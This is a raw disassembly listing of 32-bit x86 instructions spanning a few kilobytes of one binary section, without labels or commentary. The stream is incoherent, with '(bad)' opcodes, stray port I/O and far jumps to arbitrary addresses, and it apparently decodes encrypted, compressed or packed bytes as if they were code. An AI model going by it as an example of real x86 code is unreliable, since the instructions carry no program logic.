  413ac0:	add    DWORD PTR [edx],0x69d92ff7
  413ac6:	rol    DWORD PTR [edi],1
  413ac8:	out    dx,al
  413ac9:	add    al,0xaa
  413acb:	pop    ds
  413acc:	and    DWORD PTR [eax-0x260b7251],ebx
  413ad2:	enter  0xad1b,0xe6
  413ad6:	shl    BYTE PTR [edi-0x65],cl
  413ad9:	mov    al,dl
  413adb:	mov    cl,0xf8
  413add:	mov    ebp,0x243dfb8f
  413ae2:	mov    ds:0x83b50ce4,eax
  413ae7:	xchg   DWORD PTR [eax+0x72],edx
  413aea:	mov    BYTE PTR [esi+0x1c],dh
  413aed:	ins    BYTE PTR es:[edi],dx
  413aee:	stos   DWORD PTR es:[edi],eax
  413aef:	pushf  
  413af0:	cmp    edx,DWORD PTR [ebx+0x30]
  413af3:	push   ecx
  413af4:	jp     0x413ab0
  413af6:	pop    eax
  413af7:	push   0x40507552
  413afc:	mov    esi,eax
  413afe:	shl    BYTE PTR [ecx],1
  413b00:	cdq    
  413b01:	inc    esi
  413b02:	push   esi
  413b03:	lock cs and al,0xbf
  413b07:	xchg   edx,eax
  413b08:	mov    BYTE PTR [esi+0x77],bh
  413b0b:	fcom   QWORD PTR [ebx-0x5c]
  413b0e:	jg     0x413b32
  413b10:	cld    
  413b11:	sbb    ecx,DWORD PTR [esi-0x83eea9b]
  413b17:	push   edx
  413b18:	jmp    0x413abf
  413b1a:	js     0x413b2d
  413b1c:	cli    
  413b1d:	push   ebx
  413b1e:	out    dx,al
  413b1f:	mul    BYTE PTR [ecx+ebx*4+0x3fd324b0]
  413b26:	sub    eax,0xbc294451
  413b2b:	pushf  
  413b2c:	inc    ebp
  413b2d:	leave  
  413b2e:	inc    esi
  413b2f:	push   es
  413b30:	pop    ebx
  413b31:	call   0x6e9e:0xf9376985
  413b38:	pop    eax
  413b39:	xchg   esp,eax
  413b3a:	int3   
  413b3b:	push   ebp
  413b3c:	mov    edx,0xf57879fe
  413b41:	lock or al,ch
  413b44:	repz sub BYTE PTR [esi],dh
  413b47:	test   eax,0x307f0a46
  413b4c:	pop    edi
  413b4d:	arpl   WORD PTR [edx],dx
  413b4f:	xor    bl,BYTE PTR [edx+ebp*1+0x12]
  413b53:	mov    ecx,0xe5793107
  413b58:	ret    0x382
  413b5b:	dec    ebx
  413b5c:	mov    ch,0xdf
  413b5e:	cmp    al,0x6d
  413b60:	out    dx,eax
  413b61:	loop   0x413b1f
  413b63:	iret   
  413b64:	mov    BYTE PTR [edi-0x6ff1e01c],0x92
  413b6b:	xor    edx,DWORD PTR [edi+0x63]
  413b6e:	lea    eax,[edi]
  413b70:	in     eax,dx
  413b71:	inc    esp
  413b72:	cmp    cl,cl
  413b74:	loop   0x413b04
  413b76:	imul   eax,DWORD PTR [edi],0x6bb6d8c6
  413b7c:	pop    edx
  413b7d:	mov    al,BYTE PTR [eax-0x5c]
  413b80:	push   ebp
  413b81:	jns    0x413b99
  413b83:	mov    esi,0xa7262a8e
  413b88:	clc    
  413b89:	popf   
  413b8a:	pop    esi
  413b8b:	out    dx,eax
  413b8c:	lea    esi,[ecx]
  413b8e:	add    al,0x1f
  413b90:	push   esp
  413b91:	aam    0xa4
  413b93:	mov    esp,DWORD PTR [eax+0x275a7dac]
  413b99:	dec    edx
  413b9a:	call   0x80c4ddb6
  413b9f:	icebp  
  413ba0:	push   esi
  413ba1:	mov    esp,0x92c2c32c
  413ba6:	jmp    0x2e23:0x86df6577
  413bad:	xchg   edx,eax
  413bae:	add    eax,0xf73b5534
  413bb3:	repnz inc esp
  413bb5:	xlat   BYTE PTR ds:[ebx]
  413bb6:	cmp    esi,DWORD PTR [ebx-0x1561e116]
  413bbc:	adc    al,0x37
  413bbe:	(bad)  
  413bbf:	xor    bh,BYTE PTR [esi-0x112327a1]
  413bc5:	add    BYTE PTR [ebx-0x7905b7cd],ah
  413bcb:	push   ebp
  413bcc:	sub    BYTE PTR [ebp-0xb],bl
  413bcf:	sub    esp,DWORD PTR [esi-0x4a21bc18]
  413bd5:	ins    BYTE PTR es:[edi],dx
  413bd6:	sbb    al,0x22
  413bd8:	xchg   ebp,eax
  413bd9:	les    ebp,FWORD PTR [edi-0x68b7c0b3]
  413bdf:	mov    ?,eax
  413be1:	retf   
  413be2:	fsubr  DWORD PTR [bx+di+0x706e]
  413be7:	pop    ss
  413be8:	faddp  st(3),st
  413bea:	scas   eax,DWORD PTR es:[edi]
  413beb:	retf   0x4d24
  413bee:	and    al,bl
  413bf0:	gs mov al,0x63
  413bf3:	jo     0x413c15
  413bf5:	jae    0x413bd2
  413bf7:	mov    cl,0x80
  413bf9:	js     0x413c4d
  413bfb:	mov    al,ds:0x4e8e780c
  413c00:	cmc    
  413c01:	fwait
  413c02:	sub    eax,0x20c06309
  413c07:	xchg   ecx,eax
  413c08:	jae    0x413ba4
  413c0a:	mov    eax,0xdb7b9391
  413c0f:	mov    ah,0x75
  413c11:	push   es
  413c12:	enter  0x7da5,0x31
  413c16:	mov    dl,0xe3
  413c18:	adc    DWORD PTR [esi-0x7f207cb0],ebx
  413c1e:	mov    bh,BYTE PTR [edx+0x4f]
  413c21:	sbb    ebp,DWORD PTR ds:0x995fe545
  413c27:	imul   edx,DWORD PTR ds:0xd79e146b,0x7b
  413c2e:	xchg   DWORD PTR [edi-0x38],edx
  413c31:	add    eax,0xae00c68e
  413c36:	mov    BYTE PTR [esi-0x6],bh
  413c39:	cmp    bh,BYTE PTR [eax+0x28632d5b]
  413c3f:	dec    edi
  413c40:	or     BYTE PTR [esi+0x2c0d7f1b],0xf4
  413c47:	(bad)  
  413c49:	js     0x413c21
  413c4b:	push   ecx
  413c4c:	js     0x413c2b
  413c4e:	jne    0x413c22
  413c50:	dec    ebp
  413c51:	jne    0x413c08
  413c53:	xchg   esp,eax
  413c54:	aas    
  413c55:	test   eax,0x196bc648
  413c5a:	les    eax,FWORD PTR [ecx-0x5c335abc]
  413c60:	div    ah
  413c62:	mov    ds,WORD PTR [edx+0x4a3a26b3]
  413c68:	xchg   ebp,eax
  413c69:	in     al,0xd8
  413c6b:	cmp    bh,BYTE PTR [ebx+0x25]
  413c6e:	in     al,0xcd
  413c70:	cmc    
  413c71:	inc    ebp
  413c72:	pop    edx
  413c73:	es mov cl,0x6c
  413c76:	imul   ebp,ebp,0xde67de82
  413c7c:	aad    0xed
  413c7e:	int3   
  413c7f:	sbb    bh,ah
  413c81:	das    
  413c82:	(bad)  
  413c84:	and    DWORD PTR [ecx],0xc32469fe
  413c8a:	rcr    DWORD PTR [esi+esi*2-0x25],1
  413c8e:	int    0xbe
  413c90:	jmp    0x413cfc
  413c92:	sbb    eax,0xf8803c26
  413c97:	lea    ebx,[edi]
  413c99:	bound  edi,QWORD PTR [ebx+0x11]
  413c9c:	int    0xf4
  413c9e:	push   ds
  413c9f:	mov    ds:0xc1b1b4e5,al
  413ca4:	xchg   ebx,eax
  413ca5:	xchg   edi,eax
  413ca6:	adc    bh,al
  413ca8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ca9:	add    al,0x69
  413cab:	jnp    0x413c56
  413cad:	cwde   
  413cae:	sbb    eax,0xb3fa2684
  413cb3:	jno    0x413c5b
  413cb5:	mov    eax,ds:0x3755c35e
  413cba:	sbb    bh,dl
  413cbc:	aam    0x9e
  413cbe:	scas   al,BYTE PTR es:[edi]
  413cbf:	inc    ebp
  413cc0:	xor    BYTE PTR [esi-0x5a],0x96
  413cc4:	pop    edi
  413cc5:	dec    edx
  413cc6:	sbb    dh,BYTE PTR [eax*1+0x117445b8]
  413ccd:	pop    ebx
  413cce:	stos   DWORD PTR es:[edi],eax
  413ccf:	les    ecx,FWORD PTR [esi]
  413cd1:	inc    ebx
  413cd2:	pusha  
  413cd3:	enter  0xac5,0x92
  413cd7:	loope  0x413ccf
  413cd9:	dec    ebx
  413cda:	cmp    al,0x60
  413cdc:	push   edi
  413cdd:	xor    al,0x9e
  413cdf:	out    0xa6,al
  413ce1:	and    al,0x65
  413ce3:	loop   0x413c74
  413ce5:	pop    edx
  413ce6:	loopne 0x413d0e
  413ce8:	jbe    0x413c8e
  413cea:	cmp    ecx,DWORD PTR [edx]
  413cec:	outs   dx,BYTE PTR ds:[esi]
  413ced:	rol    BYTE PTR [ecx],cl
  413cef:	push   eax
  413cf0:	sub    esi,edx
  413cf2:	test   DWORD PTR ds:0xbc561586,ecx
  413cf8:	das    
  413cf9:	scas   eax,DWORD PTR es:[edi]
  413cfa:	xchg   cl,bl
  413cfc:	into   
  413cfd:	out    0xd0,al
  413cff:	xchg   esp,eax
  413d00:	pop    esp
  413d01:	cs scas eax,DWORD PTR es:[edi]
  413d03:	jns    0x413d35
  413d05:	hlt    
  413d06:	mov    ax,ds:0x6b0b4135
  413d0c:	mov    ds:0x98036f6a,eax
  413d11:	sub    DWORD PTR [eax-0x39a00168],0x8606dfdf
  413d1b:	jae    0x413d29
  413d1d:	xor    BYTE PTR [edi+ebx*8+0x1a],al
  413d21:	addr16 sub ebx,0x829443a0
  413d28:	adc    al,0x9
  413d2a:	pop    edx
  413d2b:	mov    eax,ds:0xe4713fd8
  413d30:	push   esp
  413d31:	and    al,0x85
  413d33:	js     0x413da9
  413d35:	push   es
  413d36:	xchg   DWORD PTR [ebp-0x20],esi
  413d39:	xor    dl,ch
  413d3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d3c:	xchg   ecx,eax
  413d3d:	ficom  DWORD PTR [ebx-0x58c0dfae]
  413d43:	push   edi
  413d44:	sub    DWORD PTR [ebp+ebx*4+0x2ded8e48],edi
  413d4b:	sub    eax,DWORD PTR [edx+0x41b5d96a]
  413d51:	pop    ds
  413d52:	adc    DWORD PTR [esi],ecx
  413d54:	(bad)  
  413d55:	ss push ds
  413d57:	mov    ch,0x9b
  413d59:	es mov cl,0xbb
  413d5c:	sub    eax,0xeddfd8eb
  413d61:	push   es
  413d62:	mov    WORD PTR ds:0x2d0825f,gs
  413d68:	mov    ds:0x103e6e89,eax
  413d6d:	sbb    al,0xc6
  413d6f:	and    eax,0xc9474a55
  413d74:	pushf  
  413d75:	add    DWORD PTR cs:[esp+eax*8],0x39
  413d7a:	pop    es
  413d7b:	add    ebx,DWORD PTR es:[edi-0x5b]
  413d7f:	loop   0x413d45
  413d81:	aad    0x51
  413d83:	lds    eax,FWORD PTR [ebp-0x78e2a968]
  413d89:	or     eax,0xe598afef
  413d8e:	jg     0x413d28
  413d90:	xor    eax,0x6cf80ed3
  413d95:	add    ch,BYTE PTR [ebx+0x4c]
  413d98:	gs cmp ch,ch
  413d9b:	stos   BYTE PTR es:[edi],al
  413d9c:	and    ch,ch
  413d9e:	mov    esp,0x26dbf9c2
  413da3:	lock xor DWORD PTR [edx+0x2d],edi
  413da7:	bound  esp,QWORD PTR [edx*1+0x433c83b2]
  413dae:	pop    ds
  413daf:	div    DWORD PTR [edx]
  413db1:	ja     0x413dc0
  413db3:	iret   
  413db4:	jg     0x413d52
  413db6:	(bad)  
  413db7:	jl     0x413dbe
  413db9:	rcr    DWORD PTR [ecx+0x54738d34],cl
  413dbf:	pop    ebp
  413dc0:	jle    0x413d73
  413dc2:	xor    DWORD PTR [eax+0x71fc02d],ebp
  413dc8:	mov    cx,es
  413dcb:	mov    edi,0x1f32d40a
  413dd0:	adc    DWORD PTR [eax],ecx
  413dd2:	and    BYTE PTR [edi+0xc],dl
  413dd5:	(bad)  
  413dd6:	or     edx,edi
  413dd8:	retf   0x18b8
  413ddb:	(bad)  
  413ddc:	lock in al,dx
  413dde:	shl    ebp,1
  413de0:	es adc dl,dl
  413de3:	adc    al,0x6
  413de5:	xchg   edx,eax
  413de6:	lock test al,0x80
  413de9:	enter  0x93de,0xe6
  413ded:	js     0x413e09
  413def:	in     eax,0x23
  413df1:	mov    dh,0x46
  413df3:	pop    esi
  413df4:	fnclex 
  413df6:	stos   DWORD PTR es:[edi],eax
  413df7:	es mov eax,0x823b8437
  413dfd:	ds sub al,0xd6
  413e00:	ins    DWORD PTR es:[edi],dx
  413e01:	sbb    BYTE PTR [eax],ah
  413e03:	xchg   ecx,eax
  413e04:	lods   al,BYTE PTR ds:[esi]
  413e05:	add    dh,BYTE PTR [edx]
  413e07:	neg    BYTE PTR [ebp+0x58]
  413e0a:	fnstcw WORD PTR [edi+0xb2f6f98]
  413e10:	dec    eax
  413e11:	add    al,0x99
  413e13:	push   eax
  413e14:	jne    0x413e17
  413e16:	fwait
  413e17:	xchg   ebp,eax
  413e18:	idiv   DWORD PTR [ecx+0x64]
  413e1b:	or     ch,0xe2
  413e1e:	mov    bh,0x74
  413e20:	xlat   BYTE PTR ds:[ebx]
  413e21:	out    0xcf,al
  413e23:	pop    edi
  413e24:	jg     0x413e01
  413e26:	adc    edi,esp
  413e28:	xchg   edi,eax
  413e29:	jmp    0x413e74
  413e2b:	jae    0x413e8e
  413e2d:	call   0x3fa907ea
  413e32:	(bad)  
  413e34:	jmp    0x413dd8
  413e36:	mov    bh,0x86
  413e38:	out    0xa8,al
  413e3a:	add    ebp,DWORD PTR [edx-0x7f5e600e]
  413e40:	mov    BYTE PTR [ebx+ecx*1-0xe],bl
  413e44:	mov    ebp,0xff0c89fc
  413e49:	mov    cs,WORD PTR [ecx+0x7]
  413e4c:	fldcw  WORD PTR [edx-0x65dddcb2]
  413e52:	cmp    eax,0x1b0e6b43
  413e57:	inc    esi
  413e58:	(bad)  
  413e59:	xchg   esp,eax
  413e5a:	mov    edx,0x7cf327c5
  413e5f:	or     edi,DWORD PTR [ecx]
  413e61:	and    eax,DWORD PTR [esi-0x6b]
  413e64:	addr16 fcomp st(3)
  413e67:	push   cs
  413e68:	stos   BYTE PTR es:[edi],al
  413e69:	mov    cl,0x54
  413e6b:	popa   
  413e6c:	outs   dx,DWORD PTR ds:[esi]
  413e6d:	jp     0x413e80
  413e6f:	out    0x89,al
  413e71:	cs addr16 xchg edx,eax
  413e74:	dec    esp
  413e75:	js     0x413dfc
  413e77:	in     eax,0xe5
  413e79:	mov    al,ds:0xf97e7136
  413e7e:	stos   BYTE PTR es:[edi],al
  413e7f:	bnd jae 0x413e0b
  413e82:	test   ecx,eax
  413e84:	mov    edi,0x9ee8d025
  413e89:	sahf   
  413e8a:	push   ebp
  413e8b:	loopne 0x413ec9
  413e8d:	push   ebx
  413e8e:	push   esi
  413e8f:	int    0x50
  413e91:	dec    ebp
  413e92:	mov    esi,0x8a4bf882
  413e97:	test   eax,0x99b7116c
  413e9c:	sub    BYTE PTR fs:[eax-0x50982a7a],cl
  413ea3:	push   esp
  413ea4:	dec    DWORD PTR [ebp-0x60]
  413ea7:	sub    esp,DWORD PTR [eax]
  413ea9:	retf   
  413eaa:	or     BYTE PTR [ebx-0xb],dl
  413ead:	jmp    0x620a6a88
  413eb2:	or     esi,DWORD PTR [esi]
  413eb4:	out    0x85,al
  413eb6:	(bad)  
  413eb7:	mov    WORD PTR [edi-0x79],fs
  413eba:	cmp    DWORD PTR [esi+0x53],0x69
  413ebe:	ds pop ss
  413ec0:	and    BYTE PTR [ebp-0x3d31c6f3],dl
  413ec6:	jnp    0x413e4d
  413ec8:	and    BYTE PTR [edx],bl
  413eca:	push   edx
  413ecb:	shl    BYTE PTR [esi-0x12e77c11],0xb3
  413ed2:	movq   QWORD PTR ds:0x4be0c121,mm1
  413ed9:	xor    ebp,eax
  413edb:	fstp   TBYTE PTR ds:0x98b4a0c0
  413ee1:	out    0x38,al
  413ee3:	push   es
  413ee4:	test   DWORD PTR [edx],0xc039ebc3
  413eea:	jne    0x413e9a
  413eec:	push   es
  413eed:	into   
  413eee:	xor    DWORD PTR [ebx],esi
  413ef0:	sub    al,0x71
  413ef2:	shl    cl,cl
  413ef4:	or     BYTE PTR [ebx-0x7b],0x25
  413ef8:	cmp    BYTE PTR ds:0x341c297b,dl
  413efe:	out    0xb3,al
  413f00:	aaa    
  413f01:	dec    ebp
  413f02:	jmp    0xc6c96cc7
  413f07:	nop
  413f08:	or     cl,BYTE PTR [edi]
  413f0a:	or     esp,ebx
  413f0c:	fs cwde 
  413f0e:	retf   0x1130
  413f11:	sahf   
  413f12:	mov    edx,0x998e694c
  413f17:	push   esp
  413f18:	adc    al,0xa4
  413f1a:	pop    edx
  413f1b:	adc    eax,0xb2a019ec
  413f20:	(bad)  
  413f21:	push   es
  413f22:	dec    eax
  413f23:	jns    0x413eee
  413f25:	ret    0x152d
  413f28:	out    dx,al
  413f29:	pop    esp
  413f2a:	rcr    DWORD PTR [eax],cl
  413f2c:	(bad)  [ecx+0x7b765802]
  413f32:	nop
  413f33:	repnz shl DWORD PTR [edx-0x60],1
  413f37:	dec    ecx
  413f38:	prefetchw BYTE PTR [ecx+0x52]
  413f3c:	or     bh,BYTE PTR [esi]
  413f3e:	inc    ebp
  413f3f:	into   
  413f40:	add    ah,BYTE PTR [esi]
  413f42:	mov    WORD PTR [edx+0x71f95a5a],?
  413f48:	mov    edx,0xc1d64a10
  413f4d:	test   al,0x17
  413f4f:	sbb    eax,0x3591dbfe
  413f54:	jne    0x413fa0
  413f56:	test   al,0x3
  413f58:	pop    ecx
  413f59:	(bad)  
  413f5a:	xlat   BYTE PTR ds:[ebx]
  413f5b:	inc    esi
  413f5c:	add    DWORD PTR ss:[edx+0x46563b7b],edi
  413f63:	fstp   DWORD PTR [edx+0x1]
  413f66:	test   al,0x5b
  413f68:	cdq    
  413f69:	pushf  
  413f6a:	div    DWORD PTR [ecx]
  413f6c:	pop    ss
  413f6d:	xchg   ebp,eax
  413f6e:	(bad)
  413f72:	mov    ah,0x9a
  413f74:	adc    BYTE PTR [edx+0x158e1a6a],bh
  413f7a:	sbb    ebp,esi
  413f7c:	xor    BYTE PTR [ecx],ch
  413f7e:	mov    ch,0x70
  413f80:	mov    bh,0xb
  413f82:	data16 loope 0x413fac
  413f85:	jp     0x413fbc
  413f87:	pop    ebx
  413f88:	out    0xc9,al
  413f8a:	or     al,0xef
  413f8c:	in     al,dx
  413f8d:	or     bh,ah
  413f8f:	push   esp
  413f90:	dec    ebx
  413f91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f92:	ins    BYTE PTR es:[edi],dx
  413f93:	outs   dx,DWORD PTR ds:[esi]
  413f94:	cmp    DWORD PTR [ecx-0x2073a367],esp
  413f9a:	jg     0x413f6d
  413f9c:	rcl    DWORD PTR [esi],cl
  413f9e:	ret    0xc333
  413fa1:	es (bad) 
  413fa3:	pop    ebx
  413fa4:	mov    es,WORD PTR [ecx-0x40]
  413fa7:	mov    al,0xcd
  413fa9:	in     eax,dx
  413faa:	(bad)  
  413fac:	dec    ecx
  413fad:	fmul   QWORD PTR [ecx]
  413faf:	pop    ecx
  413fb0:	fld    DWORD PTR [edi+0x26cd8c26]
  413fb6:	dec    esp
  413fb7:	clc    
  413fb8:	sub    BYTE PTR ds:0x935138ea,ch
  413fbe:	sbb    BYTE PTR [edi+0x7a013e3e],0x7c
  413fc5:	sub    eax,0x571d3610
  413fca:	dec    esi
  413fcb:	jmp    DWORD PTR [ebx-0x13]
  413fce:	iret   
  413fcf:	pop    ebx
  413fd0:	push   ebp
  413fd1:	arpl   WORD PTR [edi],sp
  413fd3:	xor    edx,DWORD PTR [ecx]
  413fd5:	inc    eax
  413fd6:	adc    eax,0x4bc038bb
  413fdb:	pushf  
  413fdc:	dec    ecx
  413fdd:	(bad)  
  413fdf:	pop    es
  413fe0:	mov    ch,0x67
  413fe2:	repnz or al,0x7f
  413fe5:	mov    edi,0xba7ffb88
  413fea:	pop    ss
  413feb:	shl    DWORD PTR ds:0x567aac06,cl
  413ff1:	and    edx,DWORD PTR [ebp+edx*8+0x3e]
  413ff5:	imul   ecx,ebp,0xa
  413ff8:	in     al,0xaa
  413ffa:	aad    0x77
  413ffc:	mov    esp,0xb8a010e5
  414001:	jle    0x414009
  414003:	and    eax,0x58b2d4ba
  414008:	xlat   BYTE PTR ds:[ebx]
  414009:	dec    bx
  41400b:	test   DWORD PTR [edx+0x5e9b436a],ebp
  414011:	sbb    dl,al
  414013:	inc    edx
  414014:	pushf  
  414015:	fs aad 0x1d
  414018:	mov    ds:0x6527013,al
  41401d:	xchg   DWORD PTR [edx],esi
  41401f:	in     al,dx
  414020:	out    dx,al
  414021:	add    edi,DWORD PTR [ecx+ecx*8-0x30fcd2e]
  414028:	xlat   BYTE PTR ds:[ebx]
  414029:	fiadd  WORD PTR [edx-0x64]
  41402c:	dec    ebp
  41402d:	loope  0x414059
  41402f:	or     BYTE PTR [edx+0x2a578185],al
  414035:	push   edx
  414036:	adc    esp,ebp
  414038:	inc    eax
  414039:	fcom   QWORD PTR [ebp+0x5a]
  41403c:	pop    ebx
  41403d:	out    0x68,eax
  41403f:	xchg   ebx,eax
  414040:	(bad)  [ebp+0x1c]
  414043:	or     BYTE PTR [ecx],ah
  414045:	jb     0x413fe7
  414047:	lods   al,BYTE PTR ds:[esi]
  414048:	mov    ds:0x415b28ff,al
  41404d:	adc    esp,DWORD PTR [edx]
  41404f:	repz push es
  414051:	or     cl,ch
  414053:	(bad)  
  414055:	dec    edx
  414056:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414058:	jl     0x414084
  41405a:	clc    
  41405b:	mov    dl,ah
  41405d:	and    eax,0x6d671fdb
  414062:	inc    ebx
  414063:	pslld  mm0,0x34
  414067:	mov    ds:0xfc7d9331,eax
  41406c:	jbe    0x414007
  41406e:	dec    esp
  41406f:	loop   0x4140cf
  414071:	out    dx,eax
  414072:	sub    cl,BYTE PTR [edx+0x5bc794e3]
  414078:	icebp  
  414079:	in     eax,0xe7
  41407b:	push   eax
  41407c:	pushf  
  41407d:	ror    BYTE PTR [ebx],0x47
  414080:	or     al,0x58
  414082:	dec    esp
  414083:	sti    
  414084:	fwait
  414085:	outs   dx,DWORD PTR ds:[esi]
  414086:	lahf   
  414087:	icebp  
  414088:	retf   
  414089:	jle    0x414082
  41408b:	test   BYTE PTR [edx+eax*1-0x2a413d79],bh
  414092:	add    eax,DWORD PTR [edx-0x406f21d]
  414098:	cmc    
  414099:	add    eax,0xa4764c31
  41409e:	hlt    
  41409f:	ins    DWORD PTR es:[edi],dx
  4140a0:	mov    bl,0x64
  4140a2:	sub    edi,edi
  4140a4:	int    0x58
  4140a6:	mov    al,0xdc
  4140a8:	jl     0x4140f4
  4140aa:	cld    
  4140ab:	imul   edx,DWORD PTR [edi-0x3b3a45b4],0x23
  4140b2:	pop    ecx
  4140b3:	int3   
  4140b4:	(bad)  
  4140b6:	out    0xe7,al
  4140b8:	dec    edi
  4140b9:	repz mov eax,ds:0xdf1e32fd
  4140bf:	or     al,0x45
  4140c1:	ret    0xa187
  4140c4:	test   BYTE PTR [ecx+0x8],bh
  4140c7:	shr    BYTE PTR [ebp+0xe],1
  4140ca:	dec    ecx
  4140cb:	cmp    DWORD PTR [esp+edi*8],edx
  4140ce:	sahf   
  4140cf:	pop    eax
  4140d0:	stos   DWORD PTR es:[edi],eax
  4140d1:	ror    al,cl
  4140d3:	xchg   edi,eax
  4140d4:	xchg   BYTE PTR [esi+0x6db84805],dh
  4140da:	cmp    DWORD PTR [edx],0x3e51d605
  4140e0:	mov    ds:0xf8ed5e5d,al
  4140e5:	stc    
  4140e6:	(bad)  
  4140e8:	test   eax,0xf9766ba7
  4140ed:	fcom   DWORD PTR [esi]
  4140ef:	sahf   
  4140f0:	jp     0x4140ad
  4140f2:	xchg   ecx,eax
  4140f3:	mov    edi,0xfab01aea
  4140f8:	jno    0x414084
  4140fa:	inc    edx
  4140fb:	sub    al,0xd0
  4140fd:	rol    BYTE PTR [eax],0x4
  414100:	les    esp,FWORD PTR [edx+0x9]
  414103:	push   edi
  414104:	fdiv   DWORD PTR [eax+0x3e6bccae]
  41410a:	adc    DWORD PTR [ecx+0x22],esi
  41410d:	xchg   ebx,eax
  41410e:	sbb    eax,0xc8d0bcd7
  414113:	dec    ebp
  414114:	icebp  
  414115:	xchg   edx,eax
  414116:	cmc    
  414117:	pop    edi
  414118:	and    edx,DWORD PTR [eax-0x1b]
  41411b:	daa    
  41411c:	out    0x4b,eax
  41411e:	sbb    al,0xbf
  414120:	cli    
  414121:	xchg   edi,eax
  414122:	aaa    
  414123:	outs   dx,BYTE PTR ds:[esi]
  414124:	in     eax,0xf2
  414126:	adc    BYTE PTR [esi+0x5e1147d2],bl
  41412c:	jb     0x414141
  41412e:	loop   0x4140bc
  414130:	or     ch,dh
  414132:	retf   
  414133:	dec    edi
  414134:	ret    0x2122
  414137:	xchg   DWORD PTR [ecx+ebx*2+0x2772d371],edi
  41413e:	dec    esp
  41413f:	mov    DWORD PTR ds:0x7122b488,ebx
  414145:	add    DWORD PTR [esi-0x1cc7d3ec],edx
  41414b:	or     ebp,DWORD PTR [ebx]
  41414d:	cdq    
  41414e:	cwde   
  41414f:	retf   
  414150:	int3   
  414151:	repnz cmp eax,0x1a934392
  414157:	pusha  
  414158:	std    
  414159:	mov    ds:0xfd558e37,eax
  41415e:	dec    esi
  41415f:	dec    ebp
  414160:	out    dx,al
  414161:	xchg   edi,eax
  414162:	and    eax,0x3a33f6b9
  414167:	cmp    esp,edi
  414169:	adc    BYTE PTR [edx-0x7c],al
  41416c:	push   cs
  41416d:	sahf   
  41416e:	cmp    esi,esp
  414170:	leave  
  414171:	jmp    0x4f66e557
  414176:	aas    
  414177:	(bad)  
  414178:	aas    
  414179:	stos   DWORD PTR es:[edi],eax
  41417a:	or     ah,BYTE PTR [ebx-0x5ae1b37f]
  414180:	jmp    0xf0935525
  414185:	jge    0x414130
  414187:	idiv   DWORD PTR [eax+0xdbfafe9]
  41418d:	jmp    0x4866e3dd
  414192:	icebp  
  414193:	mov    ds:0x33476327,al
  414198:	push   0xea3dd6b6
  41419d:	(bad)  
  41419f:	jne    0x414125
  4141a1:	iret   
  4141a2:	jl     0x4141cf
  4141a4:	enter  0x2a69,0x13
  4141a8:	test   BYTE PTR [esi+0x2d6930d4],0xe7
  4141af:	shl    eax,1
  4141b1:	or     al,0xbb
  4141b3:	repz ds jge 0x4141f5
  4141b7:	adc    eax,0x9cb577f8
  4141bc:	loope  0x4141cb
  4141be:	scas   al,BYTE PTR es:[edi]
  4141bf:	dec    edi
  4141c0:	pop    edx
  4141c1:	ret    
  4141c2:	inc    edx
  4141c3:	in     eax,0x44
  4141c5:	les    esp,FWORD PTR [edi+0x2fc4b4dd]
  4141cb:	sub    ebp,eax
  4141cd:	data16 outs dx,BYTE PTR ds:[esi]
  4141cf:	cmp    ebx,esi
  4141d1:	repz out 0xdc,eax
  4141d4:	xchg   DWORD PTR [ecx+0x59],esi
  4141d7:	mov    bh,0x52
  4141d9:	fwait
  4141da:	xchg   esp,eax
  4141db:	(bad)  
  4141dc:	cmc    
  4141dd:	adc    edx,DWORD PTR cs:[eax-0x2c8beb69]
  4141e4:	sar    edx,1
  4141e6:	cmp    esi,DWORD PTR [esi]
  4141e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141e9:	inc    esp
  4141ea:	nop
  4141eb:	leave  
  4141ec:	mov    ebx,0x5d858ee2
  4141f1:	ds hlt 
  4141f3:	cmp    cl,BYTE PTR ds:0xaa49eacc
  4141f9:	test   BYTE PTR [ebx],bh
  4141fb:	in     al,dx
  4141fc:	repz sti 
  4141fe:	ror    DWORD PTR [ebx+0x75],0x2a
  414202:	and    bl,BYTE PTR [edi+0x1a326fd5]
  414208:	(bad)  
  414209:	adc    al,0x9d
  41420b:	push   eax
  41420c:	xor    eax,0x8ae94a10
  414211:	jmp    0x158e:0xe322c399
  414218:	jecxz  0x41427d
  41421a:	push   ebx
  41421b:	and    ebp,ebp
  41421d:	repnz outs dx,BYTE PTR ds:[esi]
  41421f:	mov    cl,0x5e
  414221:	cmp    BYTE PTR [eax],0x4c
  414224:	pop    ss
  414225:	loope  0x41428b
  414227:	xor    esp,ecx
  414229:	cmp    DWORD PTR [esi],eax
  41422b:	inc    ebx
  41422c:	bound  ecx,QWORD PTR [ebx*8+0x6d1991b2]
  414233:	aad    0xff
  414235:	pop    ecx
  414236:	inc    esi
  414237:	inc    ecx
  414238:	xor    esp,ebx
  41423a:	(bad)  
  41423b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41423c:	mov    eax,ds:0x50e16995
  414241:	mov    eax,0x9737384a
  414246:	push   ecx
  414247:	fwait
  414248:	cmp    esp,DWORD PTR [edx-0x46]
  41424b:	mov    edx,0x7b8fa3ed
  414250:	call   0xb156f890
  414255:	ins    BYTE PTR es:[edi],dx
  414256:	push   edx
  414257:	cmp    DWORD PTR [ebx],eax
  414259:	fnstcw WORD PTR [esi+0x4f]
  41425c:	or     DWORD PTR [ecx-0x43],ecx
  41425f:	inc    esi
  414260:	std    
  414261:	(bad)  
  414263:	stc    
  414264:	xor    ch,BYTE PTR [eax]
  414266:	push   ss
  414267:	xchg   ebx,eax
  414268:	or     BYTE PTR ds:0x8c1979bb,bl
  41426e:	push   0x7179047e
  414273:	adc    eax,0x70dc48b4
  414278:	or     ebx,DWORD PTR [edi+0x1f39d5cc]
  41427e:	clc    
  41427f:	into   
  414280:	aas    
  414281:	lods   eax,DWORD PTR ds:[esi]
  414282:	push   esi
  414283:	cld    
  414284:	dec    ebx
  414285:	les    ebp,FWORD PTR [eax+0x55]
  414288:	in     al,0xe5
  41428a:	and    al,BYTE PTR [ecx]
  41428c:	loope  0x414281
  41428e:	push   esi
  41428f:	jns    0x4142bb
  414291:	jl     0x41430c
  414293:	loopne 0x4142ea
  414295:	mov    al,ds:0xf9c383f
  41429a:	mov    BYTE PTR [esi-0x3e],cl
  41429d:	mov    al,ds:0x5b6e6ce4
  4142a2:	mov    cl,0xcf
  4142a4:	pop    edi
  4142a5:	sbb    eax,0x6d5989b5
